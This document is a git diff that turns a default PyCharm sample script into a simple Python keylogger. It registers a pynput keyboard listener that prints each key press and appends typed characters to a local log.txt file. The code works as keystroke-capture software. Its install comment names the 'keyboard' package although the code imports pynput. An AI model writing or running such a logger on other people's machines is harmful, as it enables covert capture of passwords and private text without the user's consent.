@@ -1,16 +1,21 @@
-# This is a sample Python script.
+# This should be a header for description of the program
+# REQUIRED: pip install keyboard with cmd prompt (standard, doesn't need admin permission)
 
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
-
-
-def print_hi(name):
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
+from pynput import keyboard
 
 
-# Press the green button in the gutter to run the script.
+def keyLogged(key):
+    # arg is the key pressed
+    print(str(key))
+    with open("log.txt", 'a') as logFile:  # create log.txt file & append with every inputted char
+        try:
+            inp = key.char  # get input
+            logFile.write(inp)  # append log file with input
+        except:
+            print("N/A")
+
+
 if __name__ == '__main__':
-    print_hi('PyCharm')
-
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+    listener = keyboard.Listener(on_press=keyLogged)  # call method above when a key is pressed
+    listener.start()
+    input()
